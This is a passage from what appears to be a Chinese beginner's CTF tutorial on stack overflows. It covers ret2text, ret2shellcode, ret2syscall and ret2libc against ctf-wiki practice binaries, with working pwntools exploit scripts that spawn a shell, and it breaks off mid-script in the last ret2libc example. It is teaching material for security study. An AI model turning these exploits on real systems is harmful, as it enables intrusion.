<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>
</ul>
</blockquote>
<p>但是如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了</p>
<h3 id="ret2text"><a class="header-anchor" href="#ret2text">¶</a>ret2text</h3>
<blockquote>
<p>ret2text是一种控制程序执行程序本身已有的的代码的攻击方式，我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP</p>
</blockquote>
<p>点击下载文件：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a><br>
首先使用<code>checksec</code>检查文件，发现是32位程序，且只开启了NX保护（shellcode不可执行）<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/RO5E0%250_W%609%5BCOZPIKL546G.png" alt=""><br>
拖进 ida 中观察，main 函数使用了gets</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>并且还有一个 secure() 函数，其中含有<code>/bin/sh</code><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/0P19P_C1Y%40RIV2%60F%40BVPG4G.png" alt=""><br>
其地址为<code>0x0804863A</code>，接着就是计算 s 相对于返回地址的偏移，首先打开 gdb 运行文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb ret2text</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/60TFV9HH%5DGCNT8H1%24DO%249UB.png" alt="">接着另起一个窗口使用 cyclic 工具生成字符，比如这里生成150的字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cyclic 150</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/9CXS85B9OPKNQTQEW30X7RD.png" alt=""><br>
然后放到gdb中回车<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/%29F%7DU3ZSNATF6FLKBA7D8C0Y.png" alt=""><br>
可以看到报错的地址为<code>0x62616164</code><br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/%7D~2AK6VECS04%29SP9_58GX%28D.png" alt=""><br>
然后用 cyclic 计算偏移大小为112<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/2%25%5BU%7D%5DS%25S%409TGB%5D%24Y8ZR_%7D4.png" alt=""><br>
所以exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(<span class="number">0x0804863A</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2text/7GC4%40JQ0RUJ%24VZJ9RO18%7BQQ.png" alt=""></p>
<h3 id="ret2shellcode"><a class="header-anchor" href="#ret2shellcode">¶</a>ret2shellcode</h3>
<blockquote>
<p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。</p>
</blockquote>
<p>在栈溢出的基础上，如果要执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限<br>
点击下载：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a><br>
首先使用 checksec 检查文件<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2shellcode/%5BO1EC%5B_4YCU%5DGRI%7BG6%28B%2861.png" alt=""><br>
是一个32位程序，并且几乎没有什么保护，拖进 ida 中按F5查看 mian 函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, &amp;s, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用了 gets，存在基本的栈溢出漏洞，此外还将字符串 s 复制到了 buf2，双击buf2<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2shellcode/5L3_12Y%7B_BWNCENC8XN%5B3%298.png" alt=""><br>
可以看到 buf2 在 bss 段上，地址为<code>0x0804A080</code>，使用 gdb 调试查看该段是否有可执行的权限，依次执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb ret2shellcode  #使用gdb</span><br><span class="line">b main             #在main下断点</span><br><span class="line">r                  #运行程序</span><br><span class="line">vmmap              #查看栈、bss段是否可以执行</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2shellcode/E1T%251H66ID%5DH2O_4J_C%60J%407.png" alt=""><br>
可以看到该段是具有可执行的权限，而<code>0x0804A080</code>正好在此区间</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x0804a000 0x0804b000 rwxp	&#x2F;home&#x2F;hacker&#x2F;Desktop&#x2F;gongfangword-pwn&#x2F;ret2shellcode</span><br></pre></td></tr></table></figure>
<p>所以我们可以控制程序读取 shellcode 之后，执行 bss 段处的 shellcode，首先和上面 <code>ret2text</code>一样的办法先计算出偏移<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2shellcode/8%29WKTI%7DS%295_A6ZNP%24_%25%7D%5B%5BD.png" alt=""><br>
得到112，然后开始写exp，其中 shellcode 可以由 pwntools 生成</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2shellcode&quot;</span>)</span><br><span class="line"><span class="comment">#由pwntools生成shellcode，然后通过asm转换成字节码</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#ljust是向左对齐填充字节，这里是将shellcode填充完后，不足112长度的地方用a来填充</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;a&#x27;</span>) + p32(<span class="number">0x0804A080</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>运行后成功获取交互式shell<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2shellcode/9QD%606TJT%2912MR%24UM1YQHCOB.png" alt=""></p>
<h3 id="ret2syscall"><a class="header-anchor" href="#ret2syscall">¶</a>ret2syscall</h3>
<p>ret2syscall，简单来说就是控制程序执行系统调用获取 shell，继续以题目为例<br>
点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a><br>
首先使用 checksec 检查文件<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/GE3SE5C%7DBY%7BS2%28ND%40%7DKZ%7D0K.png" alt=""><br>
32位程序，并且开启了NX保护（即shellcode不可执行)，ida 查看依然是一个典型栈溢出</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>由于我们不能像之前一样直接利用程序中的某段代码或者自己填写代码拿到shell，所以需要利用程序中的 gadgets 来获得 shell<br>
首先我们需要了解一下 Linux 的系统调用知识点：</p>
<blockquote>
<p>Linux的系统调用通过 int 80h 实现，并且用系统调用号来区分入口的函数</p>
<p>调用流程如下：<br>
1、将系统调用编号存入 eax 寄存器中<br>
2、将函数的参数存入其他通用的寄存器（ebx、ecx、edx…）<br>
2、触发 0x80 号中断</p>
</blockquote>
<p>比如我们通过系统调用执行：<code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>，如图所示<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/im.png" alt=""><br>
首先计算栈空间偏移，用之前提到的办法计算<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/%5D%29JXV8U_O%5DQ7YBCM6X91%281G.png" alt=""><br>
值求得为112，所以需要填充的空间大小为112<br>
接着需要知道 <code>execve</code> 的系统调用号（32位)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;usr&#x2F;include&#x2F;asm&#x2F;unistd_32.h | grep execve</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/%7BRU%40%40BJVQ7KHNC_WP6F7V_M.png" alt=""><br>
可以看到值为11，转换为16进制就是<code>0xb</code>，接着我们使用 <strong>ROPgadget</strong> 工具开始寻找含有<code>pop eax</code>的指令地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#39;pop|ret&#39; | grep &#39;eax&#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/R71ZMG5M21Y%282V%40Z0%29UJFRP.png" alt=""><br>
上述几个都可以控制 eax 寄存器，我们这里选取第二个，即地址为<code>0x080bb196</code><br>
接着寻找<code>pop ebx</code>的指令地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#39;pop|ret&#39; | grep &#39;ebx&#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/%25OOMLA%28_W4YBE%25M8N%28BD%7B%404.png" alt=""><br>
可以发现在找<code>pop ebx</code>的过程中发现这个地址同时包含控制 ecx、edx 的操作，所以我们选取地址<code>0x0806eb90</code>进行使用<br>
接着寻找<code>/bin/sh</code>的地址了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop --string &#39;&#x2F;bin&#x2F;sh&#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/8%245%40TQI8%60%28%60E%5BL%5DN1D03%246H.png" alt=""><br>
地址为<code>0x080be408</code>，最后只剩下<code>int 80h</code>的地址了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary rop --only &#39;int&#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/%7BXSEDSULQ%5D8AICT701B0XVY.png" alt=""><br>
地址为<code>0x08049421</code>，地址都找齐了，就可以开始写exp了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span></span><br><span class="line">bin_sh = <span class="number">0x080be408</span></span><br><span class="line">int_80 = <span class="number">0x08049421</span></span><br><span class="line"><span class="comment">#这里需要按照pop_edx_ecx_ebx的操作顺序来写，所以bin_sh在两个0后面</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(pop_eax_ret) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh) + p32(int_80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>运行后成功获得shell<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2syscall/1%5DS3L3IFJ4%5DZST2%5DPW%7D%280%40L.png" alt=""></p>
<h3 id="ret2libc"><a class="header-anchor" href="#ret2libc">¶</a>ret2libc</h3>
<p>ret2libc 简单来说就是使我们的 ret 不跳转到 vuln 或者 shellcode 上，而是跳转到了某个函数的 plt 或者该函数对应的 got 表内容，从而控制函数去执行 libc 中的函数，一般情况下使用<code>system(&quot;/bin/sh&quot;)</code><br>
在 wiki 中，一共给了三道题，分别对应不同情况</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、有system 有&#x2F;bin&#x2F;sh</span><br><span class="line">2、有system 无&#x2F;bin&#x2F;sh</span><br><span class="line">3、无system 无&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
<h4 id="有system-有-bin-sh"><a class="header-anchor" href="#有system-有-bin-sh">¶</a>有system 有/bin/sh</h4>
<p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a><br>
首先检查文件<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/1/9HRBC9%25YE%7D8Q17J%60C2LX%25%29I.png" alt=""><br>
32位程序，并且开启了 NX 保护，用 ida 查看</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>典型的栈溢出，看到有 system 函数<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/1/%7D%29DP%40%5B%25%29AXFZ%7B%28%40U%2839%5DS%40Y.png" alt=""><br>
地址为<code>0x08048460</code>，接着查找 /bin/sh 的地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary ret2libc1 --string &#39;&#x2F;bin&#x2F;sh&#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/1/J_9Y7HZ%28M%7B6AFHV%7BT%40RSZQ0.png" alt=""><br>
地址为<code>0x08048720</code>，然后找偏移大小<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/1/CZ%4083DE_V8BFQQ_RJF%5B%25P_J.png" alt=""><br>
大小为112，可以写exp了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line">system_a = <span class="number">0x08048460</span></span><br><span class="line">bin_sh_a = <span class="number">0x08048720</span></span><br><span class="line"><span class="comment">#因为是调用system函数，所以需要给一个返回地址，我们随意写一个虚假的地址即可</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(system_a) + <span class="string">&#x27;b&#x27;</span>*<span class="number">4</span> + p32(bin_sh_a)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>运行后获取shell<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/1/G%29KM4E5G%29%7B9O132DF7DLB7Y.png" alt=""></p>
<h4 id="有system-无-bin-sh"><a class="header-anchor" href="#有system-无-bin-sh">¶</a>有system 无/bin/sh</h4>
<p>这次在ida中查看，发现没有 /bin/sh 字符串，但是 main 中有 gets</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something surprise here, but I don&#x27;t think it will work.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What do you think ?&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>并且 plt 端中也有gets 函数<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/2/~Y%5DSUM%5BY%40%7D50HU4%603JVVH9E.png" alt=""><br>
所以思路就是，如果 bss 段可写，我们就通过 gets 接收我们输入的<code>/bin/sh</code>字符串，然后写入到 bss 段中，接着跳转到 system 函数中执行，整个流程图如图所示<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/2/9V22.png" alt=""><br>
我们先去看一下 bss 段地址<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/2/42Q0A_2MJ8G%291NT9UMS%28C2H.png" alt=""><br>
为<code>0x0804A080</code>，我们用 gdb 查看一下是否具有可写的权限<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/2/48T%29MSPIXSFJP%7B%7BA0NW_%284X.png" alt=""><br>
可以看到该区间是具有可写的权限，栈空间由之前的办法求得为112，所以可以写exp了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">get_addr = <span class="number">0x08048460</span></span><br><span class="line">sys_addr = <span class="number">0x08048490</span></span><br><span class="line">bss_addr = <span class="number">0x0804A080</span></span><br><span class="line"><span class="comment">#因为/bin/sh是写到bss段中，所以地址一样</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(get_addr) + p32(sys_addr) + p32(bss_addr) + p32(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>运行后成功获取shell<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/2/%603A2M3A9NZM%28RDF2%7DCQT%245U.png" alt=""></p>
<h4 id="无system-无-bin-sh"><a class="header-anchor" href="#无system-无-bin-sh">¶</a>无system 无/bin/sh</h4>
<p>在前面的基础上，再次将 system 函数地址去掉，所以这次我们需要同时找到 system 和 /bin/sh<br>
点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a><br>
首先检查文件<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA/ret2libc/3/DI%60H%2979%251TX%25ET9HB%5DIKPAQ.png" alt=""><br>
依然开启了 NX 堆栈不可执行保护，放进 ida 中查看源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No surprise anymore, system disappeard QQ.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Can you find it !?&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还是典型的 gets 栈溢出漏洞，没有 system 和 /bin/sh ，我们可以使用 libc 中的 system 和 /bin/sh。如果我们知道了 libc 中的某一个函数地址就可以确定该程序使用的libc版本，从而知道其他函数的地址。</p>
<blockquote>
<p>获得libc的某个函数地址通常使用 got 表泄露的方式（即输出某个函数对应的got表项内容），但是由于 libc 的延迟绑定，我们需要泄露的是已经执行过的函数地址</p>
</blockquote>
<p>在 main 函数中我们可以看到执行了 puts，所以我们思路如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.先通过一次栈溢出，将puts的plt地址放到返回处，通过代码中的puts(输出)功能泄露出执行过的函数(puts)的got地址</span><br><span class="line"></span><br><span class="line">2.将puts的返回地址设置为_start函数（我们在ida中看到的main()函数是用户代码的入口，是对于用户而言），而start函数是系统代码入口，是程序最初被执行的地方，也就是程序真正的入口），以用来执行system(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line"></span><br><span class="line">3.通过泄露出的got地址计算出libc中的system和&#x2F;bin&#x2F;sh的地址</span><br><span class="line"></span><br><span class="line">4.再次执行栈溢出，把返回地址换成system的地址达到getshell</span><br></pre></td></tr></table></figure>
<p>编写exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line"><span class="comment">#从程序中获取puts的plt和got以及_start地址</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"><span class="comment">#第一次栈溢出，puts函数输出puts_got，即got的地址</span></span><br><span class="line">payload_1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(puts_plt) + p32(start_addr) + p32(puts_got)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>,payload_1)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#使用题目的libc</span></span><br><span class="line">libc = elf.libc</span><br><span class="line">libcbase = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span 